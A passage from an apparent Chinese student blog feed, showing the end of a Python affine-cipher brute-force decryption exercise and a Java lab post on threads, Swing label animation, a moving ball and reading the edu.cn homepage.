<span class="literal">None</span></span><br><span class="line">    u1,u2,u3 = <span class="number">1</span>,<span class="number">0</span>,a</span><br><span class="line">    v1,v2,v3 = <span class="number">0</span>,<span class="number">1</span>,m</span><br><span class="line">    <span class="keyword">while</span> v3!=<span class="number">0</span>:</span><br><span class="line">        q = u3//v3</span><br><span class="line">        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3</span><br><span class="line">    <span class="keyword">return</span> u1%m</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AffineDecrypt</span><span class="params">(c,k1,k2)</span>:</span></span><br><span class="line">    k2 %= <span class="number">26</span></span><br><span class="line">    <span class="keyword">if</span> gcd(k1,<span class="number">26</span>) != <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">"k1 and 26 are not mutually prime, and decryption fails."</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    k1 = findModReverse(k1,<span class="number">26</span>)</span><br><span class="line">    l = len(c)</span><br><span class="line">    ans = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">        <span class="keyword">if</span> c[i].isupper():</span><br><span class="line">            ans += chr((k1*(ord(c[i])-ord(<span class="string">'A'</span>)+<span class="number">26</span>-k2))%<span class="number">26</span>+ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">elif</span> c[i].islower():</span><br><span class="line">            ans += chr((k1*(ord(c[i])-ord(<span class="string">'a'</span>)+<span class="number">26</span>-k2))%<span class="number">26</span>+ord(<span class="string">'a'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ans += c[i]</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BruteAffineDecrypt</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> k1 <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">if</span> gcd(k1,<span class="number">26</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> k2 <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">                <span class="keyword">print</span> (<span class="string">"k1 = "</span>+str(k1).zfill(<span class="number">2</span>)+<span class="string">", k2 = "</span>+str(k2).zfill(<span class="number">2</span>)+<span class="string">": "</span>+AffineDecrypt(c,k1,k2))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s = input(<span class="string">"Please enter your plaintext:\n\t"</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="number">7</span> * <span class="string">"*"</span> + <span class="string">"  Attack  "</span> + <span class="number">7</span> * <span class="string">"*"</span>)</span><br><span class="line">    BruteAffineDecrypt(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;密码学中的古典密码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="密码学" scheme="https://1187100546.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="https://1187100546.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>java第四次实验作业</title>
    <link href="https://1187100546.github.io/2020/01/03/java-4/"/>
    <id>https://1187100546.github.io/2020/01/03/java-4/</id>
    <published>2020-01-03T08:11:36.000Z</published>
    <updated>2020-01-03T08:29:35.148Z</updated>
    
    <content type="html"><![CDATA[<p>java第四次实验作业。</p><a id="more"></a><h3 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h3><p> 编写一个多线程程序，在其中实现两个定时线程，一个线程每隔1秒显示一次秒数，另一个每隔3秒显示一次字母(a,b,…)。  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">nine_2</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">String str;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">nine_2</span><span class="params">(String str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.str=str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">this</span>.str.equals(<span class="string">"a"</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">i++;</span><br><span class="line">System.out.println(i);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">sleep(<span class="number">1000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println((<span class="keyword">char</span>)(<span class="number">97</span>+j%<span class="number">26</span>));</span><br><span class="line">j++;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">sleep(<span class="number">3000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">nine_2 thread1=<span class="keyword">new</span> nine_2(<span class="string">"a"</span>);</span><br><span class="line">nine_2 thread2=<span class="keyword">new</span> nine_2(<span class="string">"b"</span>);</span><br><span class="line">thread1.start();</span><br><span class="line">thread2.start();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/laPBsH.png" alt="laPBsH.png"></p><h3 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h3><p>编写一个图形用户界面程序，窗体的宽度300，高度150，布局管理器为null，窗体上有二个标签和二个按钮，标签的位置为（10,30）和（200,60），按钮的位置为（50,100）和（150,100），它们的宽度和高度都是80和20。编写一个线程，该线程可以让标签向右或向左移动10次，每次移动10个单位，间隔1秒，通过按钮的动作事件启动上述线程，“向右走”按钮启动“向右移标签”，“向左走”按钮启动“向左移标签”，界面如下图所示。  </p><p><img src="https://s2.ax1x.com/2020/01/03/laP6ot.png" alt="laP6ot.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.BorderLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.EventQueue;</span><br><span class="line"><span class="keyword">import</span> java.awt.Point;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.JFrame;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JPanel;</span><br><span class="line"><span class="keyword">import</span> javax.swing.border.EmptyBorder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hw6.youyi.mythread;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.JLabel;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JButton;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">zuoyouyi</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> JPanel contentPane;</span><br><span class="line"><span class="keyword">private</span> JLabel lblNewLabel;</span><br><span class="line"><span class="keyword">private</span> JLabel lblNewLabel_1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Launch the application.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">EventQueue.invokeLater(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">zuoyouyi frame = <span class="keyword">new</span> zuoyouyi();</span><br><span class="line">frame.setVisible(<span class="keyword">true</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mythread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">String str;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">mythread</span><span class="params">(String str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.str=str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">this</span>.str.equals(<span class="string">"right"</span>))</span><br><span class="line">&#123;</span><br><span class="line">Point p=lblNewLabel.getLocation();</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">p.x=p.x+<span class="number">10</span>;</span><br><span class="line">lblNewLabel.setLocation(p);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">sleep(<span class="number">1000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">this</span>.str.equals(<span class="string">"left"</span>))</span><br><span class="line">&#123;</span><br><span class="line">Point p=lblNewLabel_1.getLocation();</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">p.x=p.x-<span class="number">10</span>;</span><br><span class="line">lblNewLabel_1.setLocation(p);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">sleep(<span class="number">1000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create the frame.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">zuoyouyi</span><span class="params">()</span> </span>&#123;</span><br><span class="line">setTitle(<span class="string">"\u5DE6\u53F3\u6587\u5B57\u79FB\u52A8"</span>);</span><br><span class="line">setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line">setBounds(<span class="number">100</span>, <span class="number">100</span>, <span class="number">450</span>, <span class="number">300</span>);</span><br><span class="line">contentPane = <span class="keyword">new</span> JPanel();</span><br><span class="line">contentPane.setBorder(<span class="keyword">new</span> EmptyBorder(<span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>));</span><br><span class="line">setContentPane(contentPane);</span><br><span class="line">contentPane.setLayout(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">lblNewLabel = <span class="keyword">new</span> JLabel(<span class="string">"\u5411\u53F3\u79FB\u6807\u7B7E"</span>);</span><br><span class="line">lblNewLabel.setBounds(<span class="number">42</span>, <span class="number">43</span>, <span class="number">76</span>, <span class="number">16</span>);</span><br><span class="line">contentPane.add(lblNewLabel);</span><br><span class="line"></span><br><span class="line">lblNewLabel_1 = <span class="keyword">new</span> JLabel(<span class="string">"\u5411\u5DE6\u79FB\u6807\u7B7E"</span>);</span><br><span class="line">lblNewLabel_1.setBounds(<span class="number">302</span>, <span class="number">99</span>, <span class="number">76</span>, <span class="number">16</span>);</span><br><span class="line">contentPane.add(lblNewLabel_1);</span><br><span class="line"></span><br><span class="line">JButton btnNewButton = <span class="keyword">new</span> JButton(<span class="string">"\u5411\u53F3\u79FB"</span>);</span><br><span class="line">btnNewButton.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">mythread thread1=<span class="keyword">new</span> mythread(<span class="string">"right"</span>);</span><br><span class="line">thread1.start();</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">btnNewButton.setBounds(<span class="number">69</span>, <span class="number">180</span>, <span class="number">103</span>, <span class="number">25</span>);</span><br><span class="line">contentPane.add(btnNewButton);</span><br><span class="line"></span><br><span class="line">JButton btnNewButton_1 = <span class="keyword">new</span> JButton(<span class="string">"\u5411\u5DE6\u79FB"</span>);</span><br><span class="line">btnNewButton_1.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">mythread thread2=<span class="keyword">new</span> mythread(<span class="string">"left"</span>);</span><br><span class="line">thread2.start();</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">btnNewButton_1.setBounds(<span class="number">247</span>, <span class="number">180</span>, <span class="number">103</span>, <span class="number">25</span>);</span><br><span class="line">contentPane.add(btnNewButton_1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/laP4yQ.png" alt="laP4yQ.png"></p><h3 id="三、"><a href="#三、" class="headerlink" title="三、"></a>三、</h3><p>小球向右下角移动。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.BorderLayout;</span><br><span class="line"><span class="keyword">import</span> java.awt.EventQueue;</span><br><span class="line"><span class="keyword">import</span> java.awt.Graphics;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.MouseAdapter;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.MouseEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.JFrame;</span><br><span class="line"><span class="keyword">import</span> javax.swing.JPanel;</span><br><span class="line"><span class="keyword">import</span> javax.swing.border.EmptyBorder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">lizi</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> JPanel contentPane;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Launch the application.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">EventQueue.invokeLater(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">lizi frame = <span class="keyword">new</span> lizi();</span><br><span class="line">frame.setVisible(<span class="keyword">true</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mythread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span>( i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">repaint();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">sleep(<span class="number">1000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paint</span><span class="params">(Graphics g)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.paint(g);</span><br><span class="line">    g.fillOval(<span class="number">50</span>+i*<span class="number">10</span>, <span class="number">50</span>+i*<span class="number">10</span>, <span class="number">100</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create the frame.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">lizi</span><span class="params">()</span> </span>&#123;</span><br><span class="line">setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line">setBounds(<span class="number">100</span>, <span class="number">100</span>, <span class="number">450</span>, <span class="number">300</span>);</span><br><span class="line">contentPane = <span class="keyword">new</span> JPanel();</span><br><span class="line">contentPane.setBorder(<span class="keyword">new</span> EmptyBorder(<span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>));</span><br><span class="line">contentPane.setLayout(<span class="keyword">new</span> BorderLayout(<span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">setContentPane(contentPane);</span><br><span class="line"><span class="keyword">this</span>.addMouseListener(<span class="keyword">new</span> MouseAdapter() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mouseClicked</span><span class="params">(MouseEvent e)</span> </span>&#123;</span><br><span class="line">mythread thread1=<span class="keyword">new</span> mythread();</span><br><span class="line">thread1.start();</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/laiiY6.png" alt="laiiY6.png"></p><h3 id="四、"><a href="#四、" class="headerlink" title="四、"></a>四、</h3><p>编程读取中国教育网主页html文档( URL：<a href="http://www.edu.cn" target="_blank" rel="noopener">http://www.edu.cn</a> )，显示该文档内容，并判断其中是否有字符串“中国教育和科研计算机网网络中心”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw6;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shiyi_1</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">boolean</span> flag=<span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">URL url=<span class="keyword">new</span> URL(<span class="string">"http://www.edu.cn"</span>);</span><br><span class="line">InputStream is=<span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">is = url.openStream();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">    InputStreamReader isr=<span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">isr = <span class="keyword">new</span> InputStreamReader(is,<span class="string">"utf-8"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">    BufferedReader br = <span class="keyword">new</span> BufferedReader(isr);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">String data=br.readLine();</span><br><span class="line"> <span class="keyword">while</span>(data != <span class="keyword">null</span>)&#123;</span><br><span class="line"> System.out.println(data);</span><br><span class="line"> <span class="keyword">if</span>(data.contains(<span class="string">"中国教育和科研计算机网网络中心"</span>))</span><br><span class="line"> &#123;</span><br><span class="line"> flag=<span class="keyword">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> data 